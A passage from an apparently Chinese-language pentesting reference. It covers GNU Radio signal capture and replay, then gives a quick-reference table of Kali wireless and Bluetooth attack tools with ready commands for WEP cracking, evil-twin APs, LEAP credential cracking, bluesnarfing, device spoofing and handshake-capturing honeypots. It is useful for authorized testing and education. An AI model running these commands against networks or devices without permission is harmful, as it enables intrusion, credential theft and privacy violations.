gnuradio-companion
# 在 GRC 中:Source(OSMOSDR/HackRF Source)→ 采样率/频率设置 → Sink(QT GUI Sink / File Sink)
```

**实战要点**:
- 逆向私有协议的典型链路:gqrx 找信号 → GRC 复位/解调(如 FSK demod)→ 位流分析 → rfcat/hackrf 重放。
- gr-blocks 里有 analog/digital/filter 等子库(bpsk/qpsk/gmsk/ofdm 调制在 gr-digital)。
- 生成信号做测试:Vector Source → 调制块 → HackRF Sink,无需真实设备即可先用 null source/sink 仿真。
- 学习成本最高,仅在需要"造轮子"时上;日常频谱侦察 gqrx 即可。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| wpaclean | 从多个 pcap 提取合并四次握手 | aircrack-ng(Kali 默认已装) | `wpaclean <out.cap> <in1.cap> <in2.cap>` |
| wesside-ng | WEP 全自动攻击(自动找目标刷 IV 破解) | aircrack-ng(Kali 默认已装) | `sudo wesside-ng -i wlan0mon -v <bssid>` |
| makeivs-ng | 生成含已知密钥的假 IV 文件(测试/教学) | aircrack-ng(Kali 默认已装) | `makeivs-ng -b <bssid> -k <wep-key-hex> -w makeivs.ivs` |
| easside-ng | 无客户端 WEP 攻击(需 buddy-ng 配合) | aircrack-ng(Kali 默认已装) | `sudo buddy-ng` 后 `sudo easside-ng -v <bssid> -m <mac> -s 127.0.0.1 -f wlan0mon -c 6` |
| airserv-ng | 把 monitor 网卡封装成 TCP 服务远程共享 | aircrack-ng(Kali 默认已装) | `sudo airserv-ng -p 4444 -d wlan0mon -c 6` |
| airodump-ng-oui-update | 更新 IEEE OUI 厂商数据库(airodump 显示厂商) | aircrack-ng(Kali 默认已装) | `sudo airodump-ng-oui-update` |
| airgraph-ng | 把 airodump CSV 画成 AP-客户端关系图 | airgraph-ng | `airgraph-ng -i <dump>.csv -g CAPR -o <graph>.png` |
| airbase-ng | 软 AP/evil twin 构造(套件内) | aircrack-ng(Kali 默认已装) | `sudo airbase-ng -e <essid> -c 6 wlan0mon` |
| asleap / genkeys | Cisco LEAP/PPTP 凭证破解 | asleap | `genkeys -r <wordlist> -f <hash>.dat -n <hash>.idx`;`asleap -C <challenge> -R <response> -W <wordlist>` |
| bluesnarfer | 蓝牙 bluesnarfing(经 OBEX 读通讯录等) | bluesnarfer | `sudo bluesnarfer -r 1-100 -b <bdaddr>` |
| spooftooph | 克隆/伪造蓝牙设备名、类码、地址 | spooftooph | `sudo spooftooph -i hci0 -a <bdaddr>` |
| chirp | 业余电台设备编程配置(支持多厂商) | chirp | `chirp` |
| rfcat | sub-GHz 交互式收发/重编程(Yard Stick One 等) | rfcat | `rfcat -r` |
| sparrow-wifi | GUI Wi-Fi 分析仪(整合 hackrf/ubertooth/gpsd) | sparrow-wifi | `sudo sparrow-wifi` |
| fern-wifi-cracker | GUI 自动 WiFi 破解(WEP/WPA/WPS/MITM) | fern-wifi-cracker | `sudo fern-wifi-cracker` |
| wifi-honey | 自动起多 ESSID 蜜罐+airodump 抓握手(screen 会话) | wifi-honey | `sudo wifi-honey <essid> 6 wlan0` |

> 本文档仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景,严禁用于未授权测试。
